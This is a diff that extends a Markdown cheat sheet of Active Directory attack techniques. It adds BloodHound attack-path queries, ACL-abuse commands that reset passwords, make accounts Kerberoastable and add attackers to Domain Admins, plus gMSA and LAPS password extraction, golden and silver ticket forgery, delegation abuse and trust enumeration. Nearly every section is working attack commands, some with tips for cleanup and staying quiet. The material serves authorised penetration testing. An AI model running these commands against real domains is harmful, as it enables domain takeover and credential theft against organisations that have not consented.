@@ -19,6 +19,145 @@ bloodhound-python -c DCOnly -u user01 -p 'password' -d domain.local -ns <DC_IP> 
 ```
 **Reference:** https://github.com/SpecterOps/BloodHound · https://github.com/dirkjanm/BloodHound.py
 
+### Analysis — attack paths from collected data
+After ingesting data in the BloodHound CE GUI, mark compromised principals as **Owned** (right-click → "Mark as Owned") so path queries can start from them, then use:
+- **Built-in queries:** "Shortest Path to Domain Admins", "Shortest Paths from Owned Objects", "Shortest Paths to Unconstrained Delegation Systems", "Find Kerberoastable Users", "Find AS-REP Roastable Users".
+- **Key abusable ACL edges to look for on the path:** `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `Owns`, `ForceChangePassword`, `AddMember`, `AddSelf`, `ReadGMSAPassword`, `AllowedToDelegate`, `AllowedToAct` (RBCD), `DCSync` (needs both `GetChanges` + `GetChangesAll`).
+- **Example Cypher** — shortest paths from any owned principal to Domain Admins:
+```cypher
+MATCH p=shortestPath((n {owned:true})-[r:MemberOf|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AddMember|AllowedToDelegate|AllowedToAct*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
+RETURN p
+```
+
+---
+
+## ACL Abuse — Exploiting BloodHound Edges
+
+Concrete exploitation for the ACL edges §1 lists. `attacker:pass` below is whatever principal holds the edge; `<DC_IP>` is the domain controller. Prefer `bloodyAD` on Linux attack boxes (single static binary-ish, no .NET); PowerView commands are the Windows-session equivalent.
+
+### GenericAll / WriteOwner-then-GenericAll / ForceChangePassword on a user — reset password
+**Explanation:** `GenericAll` and the `ForceChangePassword` extended right both let you reset the target's password outright without knowing the current one. Plain `GenericWrite` alone does **not** carry that extended right (it only grants attribute writes) — if the edge is `GenericWrite`, use the targeted-Kerberoasting technique below instead, or escalate it to `GenericAll` via the WriteOwner chain further down.
+```bash
+# Impacket / Samba — no PowerShell required
+net rpc password "targetuser" 'NewPassword123!' -U 'domain.local'/'attacker'%'pass' -S <DC_IP>
+
+# bloodyAD
+bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass set password targetuser 'NewPassword123!'
+```
+```powershell
+# PowerView (Windows session)
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force) -Verbose
+```
+**Reference:** https://www.thehacker.recipes/ad/movement/access-controls/abuse#genericall-forcechangepassword-on-user
+
+### GenericWrite on a user — targeted Kerberoasting
+**Explanation:** `GenericWrite` lets you write the `servicePrincipalName` attribute directly, making an otherwise non-Kerberoastable account artificially Kerberoastable — request its TGS, crack offline, then clean up the SPN to reduce footprint.
+```bash
+# 1. Add a fake SPN
+bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass set object targetuser servicePrincipalName -v 'fake/kerberoast'
+```
+```powershell
+# PowerView equivalent
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/kerberoast'}
+```
+```bash
+# 2. Request and crack the ticket
+impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile hashes.txt domain.local/attacker:pass
+hashcat -m 13100 hashes.txt rockyou.txt
+
+# 3. Remove the fake SPN afterward (cleanup / reduce detection surface)
+bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass remove object targetuser servicePrincipalName -v 'fake/kerberoast'
+```
+**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#targeted-kerberoasting-genericwrite
+
+### AddMember / AddSelf — add yourself to a privileged group
+**Explanation:** rights to add members to a group (often nested up to Domain Admins) mean you don't need any password abuse at all — just add the compromised principal directly.
+```bash
+net rpc group addmem "Domain Admins" "attacker" -U 'domain.local'/'attacker'%'pass' -S <DC_IP>
+
+bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass add groupMember "Domain Admins" attacker
+```
+```powershell
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'
+```
+**Reference:** https://www.thehacker.recipes/ad/movement/access-controls/abuse#addmember
+
+### WriteOwner — take ownership, then grant yourself rights (full chain)
+**Explanation:** `WriteOwner` alone doesn't grant control of the object — it lets you change the *owner* to yourself, and as owner you can then write a new DACL (implicit `WriteDacl`) granting yourself `GenericAll`. This is a two-step chain, not a direct primitive.
+```bash
+# 1. Take ownership of the target object
+owneredit.py -action write -new-owner attacker -target targetuser domain.local/attacker:pass -dc-ip <DC_IP>
+
+# 2. Now that you own it, write a new ACE granting yourself full control
+dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/attacker:pass -dc-ip <DC_IP>
+
+# 3. Abuse the new GenericAll — e.g. reset the password as shown above
+```
+```powershell
+# PowerView equivalent
+Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker
+Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All
+```
+**Reference:** https://github.com/fortra/impacket/blob/master/examples/owneredit.py · https://www.thehacker.recipes/ad/movement/access-controls/abuse#writeowner
+
+### ReadGMSAPassword — extract a gMSA's usable password
+**Explanation:** the `msDS-ManagedPassword` blob on a gMSA is decodable straight to an NT hash if you can read it — no cracking, immediately usable for pass-the-hash.
+```bash
+gMSADumper.py -u attacker -p pass -d domain.local -l <DC_IP>
+```
+**Reference:** https://github.com/micahvandeusen/gMSADumper
+
+### ReadLAPSPassword — read the LAPS password
+**Explanation:** legacy LAPS stores the plaintext local admin password in `ms-Mcs-AdmPwd` (readable LDAP attribute); LAPS v2 (Windows LAPS) stores an **encrypted** blob in `msLAPS-EncryptedPassword` (and `msLAPS-Password` if encryption is disabled) that needs client-side decryption.
+```bash
+# Automated, whole domain
+nxc ldap <DC_IP> -u attacker -p pass -M laps
+
+# Manual LDAP read — legacy LAPS
+ldapsearch -x -H ldap://<DC_IP> -D "attacker@domain.local" -w pass -b "DC=domain,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
+```
+```powershell
+# LAPSv2 (Windows LAPS) — msLAPS-EncryptedPassword requires the LAPS PowerShell module to decrypt, ldapsearch alone only returns ciphertext
+Get-LapsADPassword -Identity targetcomputer -AsPlainText
+```
+**Reference:** https://www.thehacker.recipes/ad/movement/credentials/dumping/laps · https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword
+
+---
+
+## Standalone Golden & Silver Tickets
+
+Single-domain ticket forging. For crossing a trust boundary (ExtraSIDs / trust-key forgery), see §3 below — this section is deliberately not duplicating that.
+
+### Golden Ticket
+**Explanation:** forge a TGT for any user (usually Administrator, or any arbitrary account) using the domain's `krbtgt` hash — grants domain-wide access as that user until the `krbtgt` password is rotated twice. Requires the krbtgt hash, obtained via DCSync — see notes/credentials-harvesting-post-exploitation.md's DCSync section for the actual dump commands (not repeated here).
+```bash
+# mimikatz (Windows, in-memory)
+kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTHASH> /ptt
+
+# Impacket ticketer.py (Linux)
+ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <DOMAIN_SID> -domain domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
+```
+**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden-ticket
+
+### Silver Ticket
+**Explanation:** forge a service ticket (TGS) directly using a **service account's own** NTLM/AES hash — no KDC contact at all (no AS-REQ, no TGS-REQ to the DC), so it's quieter than a golden ticket. Access is limited to whatever SPN you forge for.
+```bash
+ticketer.py -nthash <SERVICE_ACCT_NTHASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn cifs/target.domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass domain.local/Administrator@target.domain.local
+```
+Commonly targeted SPNs and what they grant:
+| SPN | Grants |
+|---|---|
+| `cifs/<host>` | SMB share access, remote file ops (`smbclient.py`); combine with `host` for `psexec.py` |
+| `host/<host>` | Scheduled tasks (`atexec.py`), service control (`sc.exe`), some WMI paths |
+| `http/<host>` | WinRM / PowerShell remoting (`evil-winrm -k`) |
+| `ldap/<host>` | If forged against a **DC's own** machine account hash, effectively enables DCSync-style replication via `secretsdump.py -k` |
+
+**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver-ticket
+
 ---
 
 ## 2. Kerberos Delegation Abuse
@@ -26,12 +165,22 @@ bloodhound-python -c DCOnly -u user01 -p 'password' -d domain.local -ns <DC_IP> 
 ### Unconstrained delegation
 Find via BloodHound/`findDelegation.py`. Capture TGTs of anyone authenticating to a compromised unconstrained-delegation host (e.g. via coercion of a DC against that host, then capture with Rubeus/mimikatz on Windows, or monitor via Impacket).
 ```bash
-impacket-findDelegation -u USER -p PASSWORD -d DOMAIN -dc-ip <DC_IP>   # enumerate all delegation types
+impacket-findDelegation -dc-ip <DC_IP> DOMAIN/USER:PASSWORD   # enumerate all delegation types (credentials go in the positional target, no -u/-p/-d flags)
 ```
+**Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD --trusted-for-delegation` lists delegation-trusted accounts directly.
 
 ### Constrained delegation with protocol transition (S4U2Self + S4U2Proxy)
 ```bash
 getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
+```
+
+### Constrained delegation WITHOUT protocol transition
+Identify which case applies before choosing an approach:
+- **Protocol transition (above)** — `svcaccount`'s `userAccountControl` has `TRUSTED_TO_AUTH_FOR_DELEGATION` set (BloodHound: delegation edge shows "with protocol transition"); `msDS-AllowedToDelegateTo` lists the allowed SPNs. S4U2Self works with just the service account's own credentials, so `-impersonate` succeeds outright.
+- **Without protocol transition** — `msDS-AllowedToDelegateTo` is set but `TRUSTED_TO_AUTH_FOR_DELEGATION` is NOT. S4U2Self is unavailable for arbitrary impersonation; `getST.py -impersonate` will fail unless you already hold the victim's own TGT (S4U2Self via a real TGT still functions, then S4U2Proxy chains from it). In that case, obtain the victim's TGT first (`getTGT.py` with their creds/hash, or extract via mimikatz), then request the referral service ticket:
+```bash
+getTGT.py domain.local/victimuser:password
+KRB5CCNAME=victimuser.ccache getST.py -spn cifs/target.domain.local -impersonate victimuser domain.local/svcaccount:password
 ```
 
 ### RBCD (Resource-Based Constrained Delegation)
@@ -54,12 +203,37 @@ KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass -target-ip <TARGET_IP> tar
 
 ## 3. Cross-Trust Attacks
 
+### Trust enumeration (do this before attacking a trust)
+**Explanation:** confirm trust direction, transitivity, and whether SID filtering/quarantine is active before picking ExtraSIDs vs. trust-key forgery — an outgoing-only or filtered trust rules out the ExtraSIDs path entirely.
+```cmd
+:: Native — from a domain-joined host / existing authenticated session
+nltest /domain_trusts /all_trusts
+```
+```bash
+# From a non-domain-joined attacker box: nltest itself has no -u/-p flags, so run it
+# remotely through an Impacket exec that does the authentication
+wmiexec.py domain.local/attacker:pass@<DC_IP> "nltest /domain_trusts /all_trusts"
+```
+```powershell
+# PowerView
+Get-DomainTrust
+Get-DomainTrustMapping   # recursively walks all reachable trusts, not just the current domain's
+```
+```bash
+# Impacket has no dedicated trust-listing script — LDAP query of trustedDomain objects
+# is the Linux-native fallback (ldapsearch or windapsearch)
+ldapsearch -x -H ldap://<DC_IP> -D "attacker@domain.local" -w pass -b "DC=domain,DC=local" "(objectClass=trustedDomain)"
+windapsearch.py --dc-ip <DC_IP> -d domain.local -u attacker -p pass --custom "(objectClass=trustedDomain)"
+```
+**Reference:** https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nltest · https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/ · https://github.com/ropnop/windapsearch
+
 Two paths to cross a parent/child or forest trust boundary once you own a DC on one side.
 
 ### ExtraSIDs / Golden Ticket with SID History (intra-forest, SID filtering not enforced)
 ```bash
 # Dump krbtgt hash of the child domain
 secretsdump.py child.domain.local/Administrator:password@CHILD_DC_IP -just-dc-user krbtgt
+# Faster (nxc): nxc smb CHILD_DC_IP -u Administrator -p password --ntds --user krbtgt   # pulls just the krbtgt hash via DRSUAPI
 
 # Forge a TGT injecting the parent's Enterprise Admins SID
 ticketer.py -nthash <krbtgt_NTHASH> -domain-sid <CHILD_DOMAIN_SID> -domain child.domain.local -extra-sid <PARENT_DOMAIN_SID>-519 Administrator
@@ -90,7 +264,11 @@ Then forge an inter-realm TGT with Impacket's `ticketer.py` using the extracted 
 |---|---|
 | BloodHound CE | https://github.com/SpecterOps/BloodHound |
 | BloodHound.py (Linux ingestor) | https://github.com/dirkjanm/BloodHound.py |
-| Impacket (ticketer.py, getST.py, addcomputer.py, rbcd.py, findDelegation.py, raiseChild.py) | https://github.com/fortra/impacket |
+| Impacket (ticketer.py, getST.py, addcomputer.py, rbcd.py, findDelegation.py, raiseChild.py, owneredit.py, dacledit.py) | https://github.com/fortra/impacket |
 | Rubeus (Windows) | https://github.com/GhostPack/Rubeus |
 | Mimikatz | https://github.com/gentilkiwi/mimikatz |
+| bloodyAD | https://github.com/CravateRouge/bloodyAD |
+| gMSADumper | https://github.com/micahvandeusen/gMSADumper |
+| NetExec (nxc) | https://github.com/Pennyw0rth/NetExec |
+| windapsearch | https://github.com/ropnop/windapsearch |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit |
